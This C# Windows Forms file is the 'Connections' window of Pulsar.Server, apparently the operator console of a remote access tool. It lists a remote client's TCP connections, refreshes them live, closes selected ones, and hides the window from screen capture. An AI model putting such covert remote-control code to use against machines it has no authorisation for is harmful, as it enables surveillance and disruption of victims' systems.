using Pulsar.Common.Messages;
using Pulsar.Common.Models;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmConnections : Form
    {
        private readonly Client _connectClient;
        private readonly TcpConnectionsHandler _connectionsHandler;
        private readonly Dictionary<string, ListViewGroup> _groups = new();
        private static readonly Dictionary<Client, FrmConnections> OpenedForms = new();
        private readonly HashSet<string> _newKeys = new(); // track new connections for blue highlight
        private readonly Dictionary<ListViewItem, Color> _originalForeColors = new(); // store original text color

        private readonly string _clientAddress;
        private readonly int _clientPort;

        private readonly Timer _refreshTimer;
        private bool _autoRefreshEnabled = true;
        private bool _initialLoad = true;

        public static FrmConnections CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
                return OpenedForms[client];

            FrmConnections f = new(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        public FrmConnections(Client client)
        {
            _connectClient = client;
            _connectionsHandler = new TcpConnectionsHandler(client);

            if (client.EndPoint is IPEndPoint endPoint)
            {
                _clientAddress = endPoint.Address.ToString();
                _clientPort = endPoint.Port;
            }
            else
            {
                _clientAddress = string.Empty;
                _clientPort = -1;
            }

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            // ⏱️ Setup live refresh (like Task Manager)
            _refreshTimer = new Timer { Interval = 2000 }; // refresh every 2s
            _refreshTimer.Tick += (s, e) =>
            {
                if (_autoRefreshEnabled)
                    _connectionsHandler.RefreshTcpConnections();
            };
            _refreshTimer.Start();

            autorefreshToolStripMenuItem.Checked = _autoRefreshEnabled;
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _connectionsHandler.ProgressChanged += TcpConnectionsChanged;
            MessageHandler.Register(_connectionsHandler);
        }

        private void UnregisterMessageHandler()
        {
            _refreshTimer?.Stop();
            MessageHandler.Unregister(_connectionsHandler);
            _connectionsHandler.ProgressChanged -= TcpConnectionsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
                this.Invoke((MethodInvoker)this.Close);
        }

        private readonly HashSet<string> _initialKeys = new(); // track initial connections

        private void TcpConnectionsChanged(object sender, TcpConnection[] connections)
        {
            try
            {
                if (InvokeRequired)
                {
                    Invoke(new Action<object, TcpConnection[]>(TcpConnectionsChanged), sender, connections);
                    return;
                }

                lstConnections.BeginUpdate();

                int topIndex = 0;
                try
                {
                    topIndex = lstConnections.TopItem?.Index ?? 0;
                }
                catch { /* ignore if TopItem is temporarily invalid */ }

                if (_initialLoad)
                {
                    foreach (var con in connections)
                        _initialKeys.Add(GetKey(con));
                    _initialLoad = false;
                }

                var items = lstConnections.Items.Cast<ListViewItem>().ToList();
                var existing = items.ToDictionary(x => GetKey(x), x => x);
                var seenNow = new HashSet<string>();

                foreach (var con in connections)
                {
                    try
                    {
                        string key = GetKey(con);
                        seenNow.Add(key);
                        string state = con.State.ToString();

                        if (!_groups.ContainsKey(state))
                        {
                            var g = new ListViewGroup(state, state);
                            lstConnections.Groups.Add(g);
                            _groups[state] = g;
                        }

                        if (existing.TryGetValue(key, out var item))
                        {
                            item.SubItems[5].Text = state;
                        }
                        else
                        {
                            var lvi = new ListViewItem(new[]
                            {
                                con.ProcessName,
                                con.LocalAddress,
                                con.LocalPort.ToString(),
                                con.RemoteAddress,
                                con.RemotePort.ToString(),
                                state
                            });

                            // Set colors
                            if (!string.IsNullOrEmpty(_clientAddress) &&
                                string.Equals(con.LocalAddress, _clientAddress, StringComparison.OrdinalIgnoreCase) &&
                                con.LocalPort == _clientPort)
                            {
                                lvi.ForeColor = Color.MediumSeaGreen;
                                lvi.Font = new Font(lstConnections.Font, FontStyle.Bold);
                            }
                            else if (!_initialKeys.Contains(key))
                            {
                                lvi.ForeColor = Color.FromArgb(25, 118, 210); // darker blue for new connections
                                _newKeys.Add(key); // track new connection
                            }

                            // Store original color
                            _originalForeColors[lvi] = lvi.ForeColor;

                            lvi.Group = _groups[state];
                            lstConnections.Items.Add(lvi);
                        }
                    }
                    catch { /* ignore individual connection issues */ }
                }

                // Remove missing items safely
                var toRemove = items.Where(i => !seenNow.Contains(GetKey(i))).ToList();
                foreach (var item in toRemove)
                {
                    try
                    {
                        if (item.ForeColor == Color.MediumSeaGreen)
                            continue;

                        item.ForeColor = Color.IndianRed;

                        var timer = new Timer { Interval = 800, Tag = item };
                        timer.Tick += (s, e2) =>
                        {
                            try
                            {
                                timer.Stop();
                                timer.Dispose();
                                if (lstConnections.Items.Contains(item))
                                    lstConnections.Items.Remove(item);
                            }
                            catch { }
                        };
                        timer.Start();
                    }
                    catch { }
                }

                lstConnections.EndUpdate();

                // Restore scroll position safely
                try
                {
                    if (lstConnections.Items.Count > 0 && topIndex < lstConnections.Items.Count)
                        lstConnections.TopItem = lstConnections.Items[topIndex];
                }
                catch { }

            }
            catch
            {
                // Global catch
            }
        }

        private static string GetKey(TcpConnection con) =>
            $"{con.LocalAddress}:{con.LocalPort}-{con.RemoteAddress}:{con.RemotePort}";

        private static string GetKey(ListViewItem item) =>
            $"{item.SubItems[1].Text}:{item.SubItems[2].Text}-{item.SubItems[3].Text}:{item.SubItems[4].Text}";

        private void FrmConnections_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Connections", _connectClient);
            _connectionsHandler.RefreshTcpConnections();
        }

        private void FrmConnections_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectionsHandler.RefreshTcpConnections();
        }

        private void closeConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            bool modified = false;

            foreach (ListViewItem lvi in lstConnections.SelectedItems)
            {
                _connectionsHandler.CloseTcpConnection(
                    lvi.SubItems[1].Text,
                    ushort.Parse(lvi.SubItems[2].Text),
                    lvi.SubItems[3].Text,
                    ushort.Parse(lvi.SubItems[4].Text));

                modified = true;
            }

            if (modified)
                _connectionsHandler.RefreshTcpConnections();
        }

        private void lstConnections_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            lstConnections.LvwColumnSorter.NeedNumberCompare = (e.Column == 2 || e.Column == 4);
        }

        private void autorefreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _autoRefreshEnabled = !_autoRefreshEnabled;
            autorefreshToolStripMenuItem.Checked = _autoRefreshEnabled;

            if (_autoRefreshEnabled)
            {
                _refreshTimer.Start();
                _connectionsHandler.RefreshTcpConnections();
                this.Text = WindowHelper.GetWindowTitle("Connections (Auto Refresh On)", _connectClient);
            }
            else
            {
                _refreshTimer.Stop();
                this.Text = WindowHelper.GetWindowTitle("Connections (Auto Refresh Off)", _connectClient);
            }
        }

        private void SearchListView(string keyword)
        {
            keyword = keyword?.Trim().ToLower() ?? "";

            // Detect theme based on ListView background (adjust to your actual UI logic)
            bool isDarkTheme = lstConnections.BackColor.R < 128; // roughly dark if R,G,B < 128

            foreach (ListViewItem item in lstConnections.Items)
            {
                string key = GetKey(item);
                bool match = item.SubItems.Cast<ListViewItem.ListViewSubItem>()
                                .Any(sub => sub.Text.ToLower().Contains(keyword));

                if (string.IsNullOrEmpty(keyword))
                {
                    item.BackColor = Color.Empty;
                    item.ForeColor = _newKeys.Contains(key) ? Color.FromArgb(25, 118, 210) :
                                      (isDarkTheme ? Color.White : Color.Black);
                }
                else if (match)
                {
                    // Dynamic highlight based on theme
                    item.BackColor = isDarkTheme ? Color.FromArgb(80, 80, 50) : Color.LightGoldenrodYellow;
                    item.ForeColor = isDarkTheme ? Color.White : Color.Black;
                }
                else
                {
                    item.BackColor = Color.Empty;
                    item.ForeColor = _newKeys.Contains(key) ? Color.FromArgb(25, 118, 210) :
                                      (isDarkTheme ? Color.White : Color.Black);
                }
            }
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            // Detect Ctrl+F for search
            if (keyData == (Keys.Control | Keys.F))
            {
                searchToolStripMenuItem_Click(this, EventArgs.Empty);
                return true; // handled
            }

            // Detect Delete key to close selected connections
            if (keyData == Keys.Delete)
            {
                if (lstConnections.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem lvi in lstConnections.SelectedItems)
                    {
                        try
                        {
                            _connectionsHandler.CloseTcpConnection(
                                lvi.SubItems[1].Text,
                                ushort.Parse(lvi.SubItems[2].Text),
                                lvi.SubItems[3].Text,
                                ushort.Parse(lvi.SubItems[4].Text));
                        }
                        catch { /* ignore parse/connection errors */ }
                    }

                    _connectionsHandler.RefreshTcpConnections();
                }
                return true; // handled
            }

            return base.ProcessCmdKey(ref msg, keyData);
        }
        // ----------------------
        // Fix ListView redraw glitch
        // ----------------------
        protected override void OnResize(EventArgs e)
        {
            base.OnResize(e);

            try
            {
                if (lstConnections.Items.Count > 0)
                {
                    int topIndex = lstConnections.TopItem?.Index ?? 0;
                    lstConnections.BeginUpdate();
                    lstConnections.TopItem = lstConnections.Items[topIndex];
                    lstConnections.EndUpdate();
                }
            }
            catch { }
        }

        private void searchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string keyword = Microsoft.VisualBasic.Interaction.InputBox(
                "Enter search keyword:",
                "Search Connections",
                "");

            if (!string.IsNullOrWhiteSpace(keyword))
                SearchListView(keyword);
            else
                SearchListView(""); // clear highlights if empty
        }
    }
}
